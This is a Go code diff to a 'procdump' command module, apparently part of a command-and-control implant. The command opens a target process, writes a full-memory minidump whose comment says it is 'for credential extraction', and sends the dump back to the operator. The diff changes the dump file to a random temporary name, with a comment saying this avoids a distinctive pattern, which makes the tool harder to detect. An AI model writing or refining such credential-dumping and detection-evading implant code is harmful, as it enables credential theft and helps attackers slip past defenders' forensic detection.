@@ -7,7 +7,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
-	"path/filepath"
 	"strings"
 	"time"
 	"unsafe"
@@ -128,19 +127,16 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	defer windows.CloseHandle(hProcess)
 
-	// Create temp file for the dump
-	tempDir := os.TempDir()
-	dumpFileName := fmt.Sprintf("%s_%d.dmp", strings.TrimSuffix(processName, ".exe"), time.Now().Unix())
-	dumpPath := filepath.Join(tempDir, dumpFileName)
-
-	dumpFile, err := os.Create(dumpPath)
+	// Create temp file for the dump — use os.CreateTemp for random naming (no distinctive pattern)
+	dumpFile, err := os.CreateTemp("", "")
 	if err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create dump file %s: %v", dumpPath, err),
+			Output:    fmt.Sprintf("Failed to create dump file: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
+	dumpPath := dumpFile.Name()
 
 	// Use MiniDumpWithFullMemory for credential extraction
 	dumpType := uint32(MiniDumpWithFullMemory)
@@ -196,7 +192,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 	downloadMsg.IsScreenshot = false
 	downloadMsg.SendUserStatusUpdates = true
 	downloadMsg.File = file
-	downloadMsg.FileName = dumpFileName
+	downloadMsg.FileName = fmt.Sprintf("procdump_%d.dmp", targetPID)
 	downloadMsg.FullPath = dumpPath
 	downloadMsg.FinishedTransfer = make(chan int, 2)
 
